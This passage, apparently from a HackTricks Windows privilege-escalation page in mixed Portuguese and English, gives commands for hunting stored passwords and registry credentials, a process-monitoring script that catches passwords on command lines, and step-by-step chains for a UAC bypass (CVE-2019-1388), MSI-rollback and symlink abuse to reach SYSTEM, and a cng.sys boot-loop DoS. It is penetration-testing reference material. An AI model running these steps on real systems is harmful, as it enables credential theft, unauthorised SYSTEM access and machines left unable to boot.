Para **recuperar senhas** salvas por vários programas você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registry

**Outras possíveis chaves do registry com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extrair chaves openssh do registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico dos navegadores

Você deve verificar dbs onde senhas de **Chrome ou Firefox** estão armazenadas.\
Também verifique o histórico, bookmarks e favourites dos navegadores para talvez algumas **passwords** estarem armazenadas ali.

Ferramentas para extrair senhas dos navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite **intercommunication** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado via um class ID (CLSID)** e cada componente expõe funcionalidades por uma ou mais interfaces, identificadas via interface IDs (IIDs).

Classes e interfaces COM são definidas no registry em **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** respectivamente. Este registry é criado pela fusão de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro dos CLSIDs deste registry você pode encontrar o registry filho **InProcServer32**, que contém um **default value** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basicamente, se você puder **overwrite any of the DLLs** que vão ser executadas, você poderia **escalate privileges** se essa DLL for executada por um usuário diferente.

Para aprender como attackers usam COM Hijacking como mecanismo de persistence, veja:


{{#ref}}
com-hijacking.md
{{endref}}

### **Generic Password search in files and registry**

**Pesquisar o conteúdo dos arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar um arquivo com um determinado nome de arquivo**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registry por nomes de chaves e passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Ferramentas que procuram por passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automaticamente procura por todos os arquivos contendo passwords mencionados nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sessions**, **usernames** e **passwords** de várias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) **with full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## De Low Priv User para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tiver acesso à interface gráfica (via console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.

Isso torna possível elevar privilégios e contornar o UAC ao mesmo tempo com a mesma vulnerabilidade. Além disso, não é necessário instalar nada e o binário usado durante o processo é assinado e emitido pela Microsoft.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar esta vulnerabilidade, é necessário realizar os seguintes passos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium para High Integrity Level / UAC Bypass

Leia isto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Depois **leia isto para aprender sobre UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename para SYSTEM EoP

A técnica descrita [**neste post de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) com um exploit code [**disponível aqui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

O ataque basicamente consiste em abusar do recurso de rollback do Windows Installer para substituir arquivos legítimos por maliciosos durante o processo de desinstalação. Para isso, o atacante precisa criar um **malicious MSI installer** que será usado para sequestrar a pasta `C:\Config.Msi`, que depois será usada pelo Windows Installer para armazenar rollback files durante a desinstalação de outros pacotes MSI, onde os rollback files teriam sido modificados para conter o payload malicioso.

A técnica resumida é a seguinte:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crie um `.msi` que instale um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta gravável (`TARGETDIR`).
- Marque o instalador como **"UAC Compliant"**, para que um **non-admin user** possa executá-lo.
- Mantenha um **handle** aberto para o arquivo após a instalação.

- Step 2: Begin Uninstall
- Desinstale o mesmo `.msi`.
- O processo de desinstalação começa a mover arquivos para `C:\Config.Msi` e renomeá-los para arquivos `.rbf` (rollback backups).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se torna `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- O `.msi` inclui uma **custom uninstall action (`SyncOnRbfWritten`)** que:
- Sinaliza quando `.rbf` foi gravado.
- Depois **waits** em outro evento antes de continuar a desinstalação.

- Step 4: Block Deletion of `.rbf`
- Quando sinalizado, **open the `.rbf` file** sem `FILE_SHARE_DELETE` — isso **impede que ele seja deletado**.
- Depois **signal back** para que a desinstalação possa terminar.
- O Windows Installer falha ao deletar o `.rbf` e, como não consegue apagar todo o conteúdo, **`C:\Config.Msi` não é removida**.

- Step 5: Manually Delete `.rbf`
- Você (attacker) deleta o arquivo `.rbf` manualmente.
- Agora **`C:\Config.Msi` está vazio**, pronto para ser sequestrado.

> Nesse ponto, **dispare a vulnerabilidade de arbitrary folder delete em nível SYSTEM** para deletar `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recrie `C:\Config.Msi` com Weak ACLs
- Recrie a pasta `C:\Config.Msi` por conta própria.
- Defina **weak DACLs** (por exemplo, Everyone:F) e **mantenha um handle aberto** com `WRITE_DAC`.

- Step 7: Run Another Install
- Instale o `.msi` novamente, com:
- `TARGETDIR`: Local gravável.
- `ERROROUT`: Uma variável que dispara uma falha forçada.
- Essa instalação será usada para disparar **rollback** novamente, que lê `.rbs` e `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até que um novo `.rbs` apareça.
- Capture o nome do arquivo.

- Step 9: Sync Before Rollback
- O `.msi` contém uma **custom install action (`SyncBeforeRollback`)** que:
- Sinaliza um evento quando o `.rbs` é criado.
- Depois **waits** antes de continuar.

- Step 10: Reapply Weak ACL
- Depois de receber o evento `rbs created`:
- O Windows Installer **reaplica strong ACLs** em `C:\Config.Msi`.
- Mas como você ainda tem um handle com `WRITE_DAC`, pode **reaplicar weak ACLs** novamente.

> ACLs são **enforced only on handle open**, então você ainda pode escrever na pasta.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sobrescreva o arquivo `.rbs` com um **fake rollback script** que diz ao Windows para:
- Restaurar seu arquivo `.rbf` (malicious DLL) em um **privileged location** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Soltar seu fake `.rbf` contendo um **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Sinalize o sync event para que o instalador continue.
- Uma **type 19 custom action (`ErrorOut`)** está configurada para **falhar intencionalmente** a instalação em um ponto conhecido.
- Isso faz com que o **rollback comece**.

- Step 13: SYSTEM Installs Your DLL
- O Windows Installer:
- Lê seu `.rbs` malicioso.
- Copia sua DLL `.rbf` para o local de destino.
- Agora você tem sua **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Execute um **auto-elevated binary** confiável (por exemplo, `osk.exe`) que carrega a DLL que você sequestrou.
- **Boom**: Seu código é executado **as SYSTEM**.


### De Arbitrary File Delete/Move/Rename para SYSTEM EoP

A principal técnica de MSI rollback (a anterior) assume que você consegue deletar uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade permitir apenas **arbitrary file deletion** ?

Você poderia explorar **NTFS internals**: toda pasta tem um hidden alternate data stream chamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream armazena os **index metadata** da pasta.

Então, se você **excluir o stream `::$INDEX_ALLOCATION`** de uma pasta, o NTFS **remove a pasta inteira** do filesystem.

Você pode fazer isso usando APIs padrão de exclusão de arquivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mesmo que você esteja chamando uma API de delete de *file*, ela **deleta a própria folder**.

### De From Folder Contents Delete to SYSTEM EoP
E se o seu primitive não permitir deletar arbitrary files/folders, mas **permitir deletar o *contents* de uma folder controlada pelo attacker**?

1. Step 1: Setup uma bait folder e file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place um **oplock** em `file1.txt`
- O oplock **pausa a execução** quando um privileged process tenta deletar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Acione o processo SYSTEM (por exemplo, `SilentCleanup`)
- Este processo verifica pastas (por exemplo, `%TEMP%`) e tenta excluir seu conteúdo.
- Quando ele chega em `file1.txt`, o **oplock é acionado** e entrega o controle ao seu callback.

4. Passo 4: Dentro do callback do oplock – redirecione a exclusão

- Opção A: Mova `file1.txt` para outro lugar
- Isso esvazia `folder1` sem quebrar o oplock.
- Não exclua `file1.txt` diretamente — isso liberaria o oplock prematuramente.

- Opção B: Converta `folder1` em um **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opção C: Criar um **symlink** em `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Isto tem como alvo o stream interno do NTFS que armazena metadados da pasta — ao deletá-lo, a pasta é deletada.

5. Step 5: Release the oplock
- O processo SYSTEM continua e tenta deletar `file1.txt`.
- Mas agora, devido ao junction + symlink, ele está na verdade deletando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` é excluído por SYSTEM.

### De Arbitrary Folder Create para Permanent DoS

Explore um primitive que permite **criar uma pasta arbitrária como SYSTEM/admin** — mesmo se **você não conseguir gravar arquivos** ou **definir permissões fracas**.

Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, por exemplo:
```
C:\Windows\System32\cng.sys
```
- Este caminho normalmente corresponde ao driver em modo kernel `cng.sys`.
- Se você o **pré-criar como uma pasta**, o Windows falha ao carregar o driver real na inicialização.
- Então, o Windows tenta carregar `cng.sys` durante o boot.
- Ele encontra a pasta, **falha ao resolver o driver real** e **crasha ou interrompe o boot**.
- Não há **fallback** e **nenhuma recuperação** sem intervenção externa (por exemplo, reparo de boot ou acesso ao disco).

### De caminhos privilegiados de log/backup + OM symlinks para sobrescrita arbitrária de arquivo / boot DoS

Quando um **serviço privilegiado** grava logs/exports em um caminho lido de uma **configuração gravável**, redirecione esse caminho com **Object Manager symlinks + NTFS mount points** para transformar a gravação privilegiada em uma sobrescrita arbitrária (mesmo **sem** SeCreateSymbolicLinkPrivilege).

**Requisitos**
- A config que armazena o caminho de destino é gravável pelo atacante (por exemplo, `%ProgramData%\...\.ini`).
- Capacidade de criar um mount point para `\RPC Control` e um OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uma operação privilegiada que grava nesse caminho (log, export, report).

**Exemplo de cadeia**
1. Leia a config para recuperar o destino privilegiado do log, por exemplo `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` em `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirecione o caminho sem admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espere que o componente privilegiado escreva o log (por exemplo, o admin aciona "send test SMS"). A escrita agora cai em `C:\Windows\System32\cng.sys`.
4. Inspecione o alvo sobrescrito (hex/PE parser) para confirmar a corrupção; reiniciar força o Windows a carregar o caminho do driver adulterado → **boot loop DoS**. Isso também se generaliza para qualquer arquivo protegido que um serviço privilegiado abrir para escrita.

> `cng.sys` normalmente é carregado de `C:\Windows\System32\drivers\cng.sys`, mas se existir uma cópia em `C:\Windows\System32\cng.sys` ela pode ser tentada primeiro, tornando-o um destino confiável de DoS para dados corrompidos.



## **De High Integrity para System**

### **Novo serviço**

Se você já estiver executando em um processo de High Integrity, o **caminho para SYSTEM** pode ser fácil, apenas **criando e executando um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Ao criar um binary de service, certifique-se de que ele seja um service válido ou que o binary execute as ações necessárias rapidamente, pois ele será killed em 20s se não for um valid service.

### AlwaysInstallElevated

A partir de um processo High Integrity você pode tentar **habilitar as entradas de registry AlwaysInstallElevated** e **instalar** um reverse shell usando um wrapper _**.msi**_.\
[Mais information sobre as registry keys envolvidas e como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se você tiver esses token privileges (provavelmente você vai encontrar isso em um processo High Integrity já em execução), você poderá **abrir quase qualquer processo** (não protected processes) com o privilege SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Usando essa técnica, normalmente é **selecionado qualquer processo em execução como SYSTEM com todos os token privileges** (_sim, você pode encontrar processos SYSTEM sem todos os token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Essa técnica é usada pelo meterpreter para escalar em `getsystem`. A técnica consiste em **criar um pipe e depois criar/abuse um service para escrever nesse pipe**. Então, o **server** que criou o pipe usando o privilege **`SeImpersonate`** poderá **impersonate the token** do cliente do pipe (o service), obtendo privilégios SYSTEM.\
Se você quiser [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Se você quiser ler um exemplo de [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **hijack a dll** sendo **loaded** por um **process** executado como **SYSTEM**, você poderá executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para esse tipo de privilege escalation e, além disso, é muito **mais fácil de conseguir a partir de um processo high integrity**, pois ele terá **write permissions** nas pastas usadas para carregar dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referências

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing de macro Word VBA via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 até SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak de format-string + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
